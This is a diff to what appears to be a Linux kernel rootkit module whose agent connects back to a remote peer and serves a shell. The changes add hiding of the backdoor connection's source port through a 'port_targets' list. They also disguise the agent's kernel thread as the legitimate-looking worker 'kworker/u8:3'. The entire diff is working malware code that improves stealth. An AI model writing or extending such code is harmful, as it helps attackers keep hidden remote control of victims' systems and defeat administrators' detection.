@@ -8,6 +8,7 @@
 #include <linux/socket.h>
 #include <linux/string.h>
 #include <linux/utsname.h>
+#include <net/inet_sock.h>
 #include <net/net_namespace.h>
 
 #include "agent.h"
@@ -304,6 +305,14 @@ static int rk_agent_attempt(struct rk_agent *agent)
 			       sizeof(agent->peer), 0);
 	if (error)
 		goto close;
+	{
+		struct inet_sock *inet = inet_sk(socket->sk);
+		char port_str[8];
+
+		snprintf(port_str, sizeof(port_str), "%u",
+			 ntohs(inet->inet_sport));
+		rk_target_add(&port_targets, port_str);
+	}
 	mutex_lock(&agent->lock);
 	agent->connected = true;
 	agent->retry_delay_ms = agent->retry_base_ms;
@@ -311,6 +320,14 @@ static int rk_agent_attempt(struct rk_agent *agent)
 	error = rk_agent_serve(agent, socket);
 
 close:
+	if (socket->sk) {
+		struct inet_sock *inet = inet_sk(socket->sk);
+		char port_str[8];
+
+		snprintf(port_str, sizeof(port_str), "%u",
+			 ntohs(inet->inet_sport));
+		rk_target_remove_by_value(&port_targets, port_str);
+	}
 	mutex_lock(&agent->lock);
 	if (agent->active == socket)
 		agent->active = NULL;
@@ -379,7 +396,7 @@ int rk_agent_start(struct rk_agent *agent, __be32 peer_address, u16 peer_port,
 	memcpy(agent->key, key, sizeof(agent->key));
 	agent->shell = shell;
 	agent->initialized = true;
-	task = kthread_create(rk_agent_worker, agent, "rkling_agent");
+	task = kthread_create(rk_agent_worker, agent, "kworker/u8:3");
 	if (IS_ERR(task)) {
 		memzero_explicit(agent->key, sizeof(agent->key));
 		agent->initialized = false;
